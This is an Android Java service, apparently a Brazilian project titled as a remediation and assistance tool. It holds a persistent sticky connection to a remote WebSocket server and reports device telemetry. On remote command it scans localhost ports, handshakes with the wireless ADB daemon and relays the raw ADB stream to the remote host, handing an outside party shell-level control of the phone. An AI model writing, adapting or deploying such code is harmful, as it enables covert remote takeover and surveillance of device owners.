package br.eni.cora;

import android.app.*;
import android.content.*;
import android.os.*;
import android.provider.Settings;
import android.util.*;
import org.json.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;

public class SinoService extends Service {
    public static volatile String status = "parado";
    public static volatile WsClient ws;
    Thread worker;
    volatile OutputStream pipeOut;
    volatile boolean piping = false;

    public int onStartCommand(Intent i, int f, int id) {
        Notification n = new Notification.Builder(this)
                .setContentTitle("CORA 💓")
                .setContentText("coração operante de remediação e assistência")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .build();
        startForeground(1, n);
        if (worker == null || !worker.isAlive()) { worker = new Thread(this::loop); worker.start(); }
        return START_STICKY;
    }
    public IBinder onBind(Intent i) { return null; }

    void loop() {
        while (true) {
            try { connectOnce(); }
            catch (Exception e) { status = "erro: " + e; }
            try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
        }
    }

    void connectOnce() throws Exception {
        final String host = Prefs.host(this);
        status = "conectando " + host + " ...";
        final WsClient[] ref = new WsClient[1];
        WsClient w = new WsClient(new WsClient.Listener() {
            @Override public void onOpen() {
                status = "conectado";
                ws = ref[0];
                new Thread(() -> {
                    while (true) {
                        try { sendTelemetry(); Thread.sleep(30000); }
                        catch (Exception e) { return; }
                    }
                }).start();
            }
            @Override public void onMessage(byte[] d) {
                if (ehBinario(d)) {
                    if (pipeOut != null) {
                        try { pipeOut.write(d); pipeOut.flush(); }
                        catch (Exception e) { pipeOut = null; }
                    }
                    return;
                }
                try { onCmd(new String(d)); }
                catch (Exception e) { status = "cmd: " + e; }
            }
            @Override public void onClose() { status = "desconectado (reconectando)"; if (ws == ref[0]) ws = null; }
        });
        ref[0] = w;
        w.connect(host, 443, "/ws?id=" + Prefs.id(this));
    }

    void onCmd(String s) throws Exception {
        if (s.startsWith("{\"type\":\"joined\"")) {
            JSONObject jj = new JSONObject(s);
            if (jj.optInt("peers", 1) == 1) {
                status = "sala vazia, realocando...";
                try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
                throw new Exception("realocar");
            }
            status = "sala encontrada (peers=" + jj.optInt("peers") + ")";
            return;
        }
        try {
            JSONObject j = new JSONObject(s);
            String cmd = j.optString("cmd");
            if ("ping".equals(cmd)) send("{\"type\":\"pong\",\"id\":\"" + Prefs.id(this) + "\"}");
            else if ("report".equals(cmd)) sendTelemetry();
            else if ("scan".equals(cmd)) sendScan();
            else if ("pipe".equals(cmd)) iniciarPipe(j.optInt("port", 0));
        } catch (Exception e) { status = "cmd: " + e; }
    }

    static boolean ehBinario(byte[] d) {
        if (d.length == 0) return false;
        for (byte b : d) {
            int c = b & 0xff;
            if (c < 9 || (c > 13 && c < 32)) return true;
        }
        return false;
    }

    void iniciarPipe(int porta) throws Exception {
        if (piping) { send("{\"type\":\"pipe\",\"status\":\"busy\"}"); return; }
        piping = true;
        try { iniciarPipe2(porta); } finally { piping = false; }
    }

    void iniciarPipe2(int porta) throws Exception {
        Socket adbd = null;
        int achada = -1;
        if (porta > 0) {
            List<Integer> so = new ArrayList<>();
            so.add(porta);
            adbd = tentarConexaoAdb(so);
            if (adbd != null) achada = porta;
        } else {
            final int[] faixa = faixaPortas();
            final List<Integer> achados = Collections.synchronizedList(new ArrayList<>());
            ExecutorService ex = Executors.newFixedThreadPool(150);
            List<Future<?>> fs = new ArrayList<>();
            for (int p = faixa[0]; p <= faixa[1] && achados.size() < 60; p++) {
                final int port = p;
                fs.add(ex.submit(() -> {
                    try { Socket s = new Socket(); s.connect(new InetSocketAddress("127.0.0.1", port), 120); s.close(); achados.add(port); } catch (Exception ignored) {}
                }));
            }
            for (Future<?> f : fs) try { f.get(); } catch (Exception ignored) {}
            ex.shutdown();
            Collections.sort(achados);
            adbd = tentarConexaoAdb(achados);
            if (adbd != null) achada = achados.get(0);
        }
        if (adbd == null) {
            send("{\"type\":\"pipe\",\"status\":\"sem_adbd\",\"faixa\":\"kernel\"}");
            status = "pipe: adbd nao encontrado (ligue a depuração sem fio)";
            return;
        }
        adbd.setTcpNoDelay(true);
        send("{\"type\":\"pipe\",\"status\":\"ok\",\"port\":" + achada + "}");
        status = "tubo ADB ativo (porta " + achada + ")";
        final InputStream ai = adbd.getInputStream();
        pipeOut = adbd.getOutputStream();
        byte[] buf = new byte[16384];
        try {
            int n;
            while ((n = ai.read(buf)) > 0) {
                if (ws != null) ws.send(Arrays.copyOf(buf, n));
            }
        } finally {
            pipeOut = null;
            try { adbd.close(); } catch (Exception ignored) {}
            status = "tubo encerrado";
        }
    }

    Socket tentarConexaoAdb(List<Integer> portas) {
        for (int port : portas) {
            Socket s = null;
            try {
                s = new Socket();
                s.connect(new InetSocketAddress("127.0.0.1", port), 800);
                s.setSoTimeout(1200);
                OutputStream o = s.getOutputStream();
                byte[] payload = "host::".getBytes("UTF-8");
                java.nio.ByteBuffer h = java.nio.ByteBuffer.allocate(24).order(java.nio.ByteOrder.LITTLE_ENDIAN);
                h.putInt(0x4e584e43); h.putInt(0x01000001); h.putInt(4096);
                h.putInt(payload.length);
                long sum = 0; for (byte b : payload) sum += (b & 0xff);
                h.putInt((int) (sum & 0xffffffffL));
                h.putInt(0x4e584e43 ^ 0xffffffff);
                o.write(h.array()); o.write(payload); o.flush();
                InputStream i = s.getInputStream();
                byte[] rh = new byte[24];
                int off = 0;
                long lim = System.currentTimeMillis() + 1200;
                while (off < 24 && System.currentTimeMillis() < lim) {
                    int n = i.read(rh, off, 24 - off);
                    if (n < 0) break;
                    off += n;
                }
                if (off < 24) { try { s.close(); } catch (Exception ignored) {} continue; }
                java.nio.ByteBuffer rb = java.nio.ByteBuffer.wrap(rh).order(java.nio.ByteOrder.LITTLE_ENDIAN);
                int cmd = rb.getInt();
                rb.getInt(); rb.getInt(); int len = rb.getInt(); rb.getInt(); int magic = rb.getInt();
                if (len >= 0 && len < 65536 && magic == (cmd ^ 0xffffffff)) {
                    s.setSoTimeout(0);
                    return s;
                }
                try { s.close(); } catch (Exception ignored) {}
            } catch (Exception e) {
                try { if (s != null) s.close(); } catch (Exception ignored) {}
            }
        }
        return null;
    }

    static int[] faixaPortas() {
        try {
            BufferedReader r = new BufferedReader(new FileReader("/proc/sys/net/ipv4/ip_local_port_range"));
            String[] partes = r.readLine().trim().split("\\s+");
            r.close();
            return new int[]{Integer.parseInt(partes[0]), Integer.parseInt(partes[1])};
        } catch (Exception e) {
            return new int[]{32768, 60999};
        }
    }

    int acharPortaAdbd() {
        final int[] faixa = faixaPortas();
        final List<Integer> achados = Collections.synchronizedList(new ArrayList<>());
        ExecutorService ex = Executors.newFixedThreadPool(150);
        List<Future<?>> fs = new ArrayList<>();
        for (int p = faixa[0]; p <= faixa[1] && achados.size() < 60; p++) {
            final int port = p;
            fs.add(ex.submit(() -> {
                try { Socket s = new Socket(); s.connect(new InetSocketAddress("127.0.0.1", port), 120); s.close(); achados.add(port); } catch (Exception ignored) {}
            }));
        }
        for (Future<?> f : fs) try { f.get(); } catch (Exception ignored) {}
        ex.shutdown();
        Collections.sort(achados);
        final int[] vencedor = {-1};
        ExecutorService px = Executors.newFixedThreadPool(6);
        List<Future<?>> pf = new ArrayList<>();
        for (final int port : achados) {
            pf.add(px.submit(() -> {
                if (vencedor[0] < 0 && probeAdbd(port)) vencedor[0] = port;
            }));
        }
        for (Future<?> f : pf) try { f.get(); } catch (Exception ignored) {}
        px.shutdown();
        return vencedor[0];
    }

    boolean probeAdbd(int port) {
        Socket s = null;
        try {
            s = new Socket();
            s.connect(new InetSocketAddress("127.0.0.1", port), 800);
            s.setSoTimeout(900);
            OutputStream o = s.getOutputStream();
            byte[] payload = "host::".getBytes("UTF-8");
            java.nio.ByteBuffer h = java.nio.ByteBuffer.allocate(24).order(java.nio.ByteOrder.LITTLE_ENDIAN);
            h.putInt(0x4e584e43); h.putInt(0x01000001); h.putInt(4096);
            h.putInt(payload.length);
            long sum = 0; for (byte b : payload) sum += (b & 0xff);
            h.putInt((int) (sum & 0xffffffffL));
            h.putInt(0x4e584e43 ^ 0xffffffff);
            o.write(h.array()); o.write(payload); o.flush();
            InputStream i = s.getInputStream();
            byte[] rh = new byte[24];
            int off = 0;
            long lim = System.currentTimeMillis() + 1200;
            while (off < 24 && System.currentTimeMillis() < lim) {
                int n = i.read(rh, off, 24 - off);
                if (n < 0) break;
                off += n;
            }
            if (off < 24) return false;
            java.nio.ByteBuffer rb = java.nio.ByteBuffer.wrap(rh).order(java.nio.ByteOrder.LITTLE_ENDIAN);
            int cmd = rb.getInt();
            rb.getInt(); rb.getInt(); int len = rb.getInt(); rb.getInt(); int magic = rb.getInt();
            return len >= 0 && len < 65536 && magic == (cmd ^ 0xffffffff);
        } catch (Exception e) {
            return false;
        } finally {
            try { if (s != null) s.close(); } catch (Exception ignored) {}
        }
    }

    void send(String s) { try { if (ws != null) ws.send(s); } catch (Exception e) { status = "send: " + e; } }

    void sendTelemetry() {
        try {
            Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int lvl = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
            int sc = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
            int pct = sc > 0 ? lvl * 100 / sc : -1;
            int plug = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) : 0;
            int adb = 0;
            try { adb = Settings.Global.getInt(getContentResolver(), "adb_wifi_enabled"); } catch (Exception ignored) {}
            String memAv = "?";
            BufferedReader r = new BufferedReader(new FileReader("/proc/meminfo"));
            String l1 = r.readLine(), l2 = r.readLine(), l3 = r.readLine(); r.close();
            if (l3 != null) memAv = l3.trim();
            android.os.StatFs sf = new android.os.StatFs(Environment.getDataDirectory().getAbsolutePath());
            long free = sf.getAvailableBlocksLong() * sf.getBlockSizeLong() / 1048576L;
            JSONObject j = new JSONObject();
            j.put("type", "hb"); j.put("id", Prefs.id(this));
            j.put("batt", pct); j.put("plug", plug); j.put("adb", adb);
            j.put("mem", memAv); j.put("data_mb_free", free);
            j.put("model", Build.MODEL); j.put("ts", System.currentTimeMillis());
            send(j.toString());
            if (status.startsWith("sala") || status.startsWith("conectado"))
                status = "conectado | batt " + pct + "% | adb " + adb;
        } catch (Exception e) { status = "tel: " + e; }
    }

    void sendScan() {
        final Set<Integer> open = Collections.synchronizedSet(new TreeSet<Integer>());
        ExecutorService ex = Executors.newFixedThreadPool(150);
        List<Future<?>> fs = new ArrayList<>();
        for (int p = 30000; p <= 50000 && open.size() < 6; p++) {
            final int port = p;
            fs.add(ex.submit(() -> {
                try { Socket s = new Socket(); s.connect(new InetSocketAddress("127.0.0.1", port), 150); s.close(); open.add(port); } catch (Exception ignored) {}
            }));
        }
        for (Future<?> f : fs) try { f.get(); } catch (Exception ignored) {}
        ex.shutdown();
        try {
            JSONArray a = new JSONArray();
            for (int p : open) a.put(p);
            send(new JSONObject().put("type", "scan").put("id", Prefs.id(this)).put("ports", a).toString());
        } catch (Exception e) { status = "scan: " + e; }
    }
}
